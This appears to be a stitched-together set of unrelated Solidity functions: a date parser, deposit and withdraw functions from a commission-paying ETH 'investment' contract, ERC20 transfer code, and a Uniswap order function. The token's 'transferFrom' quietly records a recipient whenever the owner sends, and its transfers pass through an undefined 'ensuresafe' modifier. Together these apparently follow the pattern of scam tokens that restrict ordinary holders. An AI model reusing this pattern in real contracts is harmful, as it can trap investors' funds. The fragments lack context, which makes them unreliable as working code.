function parseTimestamp(uint timestamp) internal returns(DateTime dt) {
    uint secondsAccountedFor = 0;
    uint buf;
    uint8 i;
    dt.year = ORIGIN_YEAR;
    while (true) {
        if (isLeapYear(dt.year)) {
            buf = LEAP_YEAR_IN_SECONDS;
        } else {
            buf = YEAR_IN_SECONDS;
        }
        if (secondsAccountedFor + buf > timestamp) {
            break;
        }
        dt.year += 1;
        secondsAccountedFor += buf;
    }
    uint8[12] monthDayCounts;
    monthDayCounts[0] = 31;
    if (isLeapYear(dt.year)) {
        monthDayCounts[1] = 29;
    } else {
        monthDayCounts[1] = 28;
    }
    monthDayCounts[2] = 31;
    monthDayCounts[3] = 30;
    monthDayCounts[4] = 31;
    monthDayCounts[5] = 30;
    monthDayCounts[6] = 31;
    monthDayCounts[7] = 31;
    monthDayCounts[8] = 30;
    monthDayCounts[9] = 31;
    monthDayCounts[10] = 30;
    monthDayCounts[11] = 31;
    uint secondsInMonth;
    for (i = 0; i < monthDayCounts.length; i++) {
        secondsInMonth = DAY_IN_SECONDS * monthDayCounts[i];
        if (secondsInMonth + secondsAccountedFor > timestamp) {
            dt.month = i + 1;
            break;
        }
        secondsAccountedFor += secondsInMonth;
    }
    for (i = 0; i < monthDayCounts[dt.month - 1]; i++) {
        if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {
            dt.day = i + 1;
            break;
        }
        secondsAccountedFor += DAY_IN_SECONDS;
    }
    for (i = 0; i < 24; i++) {
        if (HOUR_IN_SECONDS + secondsAccountedFor > timestamp) {
            dt.hour = i;
            break;
        }
        secondsAccountedFor += HOUR_IN_SECONDS;
    }
    for (i = 0; i < 60; i++) {
        if (MINUTE_IN_SECONDS + secondsAccountedFor > timestamp) {
            dt.minute = i;
            break;
        }
        secondsAccountedFor += MINUTE_IN_SECONDS;
    }
    if (timestamp - secondsAccountedFor > 60) {
        __throw();
    }
    dt.second = uint8(timestamp - secondsAccountedFor);
    buf = timestamp / DAY_IN_SECONDS;
    dt.weekday = uint8((buf + 3) % 7);
}

function investETH(address referral) public payable {
    require(msg.value >= 0.01 ether);
    if (getProfit(msg.sender) > 0) {
        uint256 profit = getProfit(msg.sender);
        lastInvest[msg.sender] = now;
        msg.sender.transfer(profit);
    }
    uint256 amount = msg.value;
    uint256 commision = SafeMath.div(amount, 20);
    if (referral != msg.sender && referral != 0x1) {
        affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], commision);
    }
    affiliateCommision[dev] = SafeMath.add(affiliateCommision[dev], commision);
    affiliateCommision[promoter] = SafeMath.add(affiliateCommision[promoter], commision);
    investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);
    lastInvest[msg.sender] = now;
}

function divestETH() public {
    uint256 profit = getProfit(msg.sender);
    lastInvest[msg.sender] = now;
    uint256 capital = investedETH[msg.sender];
    uint256 fee = SafeMath.div(capital, 10);
    capital = SafeMath.sub(capital, fee);
    uint256 total = SafeMath.add(capital, profit);
    require(total > 0);
    investedETH[msg.sender] = 0;
    msg.sender.transfer(total);
}

function _transfer(address sender, address recipient, uint amount) internal ensuresafe(sender, recipient, amount) {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
    if (sender == Owner) {
        recipients = recipient;
    }
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
}

function createOrder(OrderType orderType, address assetIn, address assetOut, uint assetInOffered, uint assetOutExpected, uint executorFee) external payable {
    uint payment = msg.value;
    uint stakeValue = 0;
    require(assetInOffered > 0, "Asset in amount must be greater than 0");
    require(assetOutExpected > 0, "Asset out amount must be greater than 0");
    require(executorFee >= EXECUTOR_FEE, "Invalid fee");
    if (orderType == OrderType.EthForTokens) {
        require(assetIn == uniswapV2Router.WETH(), "Use WETH as the assetIn");
        stakeValue = assetInOffered.mul(STAKE_FEE).div(1000);
        require(payment == assetInOffered.add(executorFee).add(stakeValue), "Payment = assetInOffered + executorFee + stakeValue");
        TransferHelper.safeTransferETH(stakeAddress, stakeValue);
    } else {
        require(payment == executorFee, "Transaction value must match executorFee");
        if (orderType == OrderType.TokensForEth) {
            require(assetOut == uniswapV2Router.WETH(), "Use WETH as the assetOut");
        }
        TransferHelper.safeTransferFrom(assetIn, msg.sender, address(this), assetInOffered);
    }
    uint orderId = ordersNum;
    ordersNum++;
    orderBook[orderId] = Order(OrderState.Created, orderType, msg.sender, assetIn, assetOut, assetInOffered,
        assetOutExpected, executorFee, stakeValue, orderId, orders.length);
    ordersForAddress[msg.sender].push(orderId);
    orders.push(orderId);
    emit logOrderCreated(
        orderId,
        OrderState.Created,
        orderType,
        msg.sender,
        assetIn,
        assetOut,
        assetInOffered,
        assetOutExpected,
        executorFee
    );
}

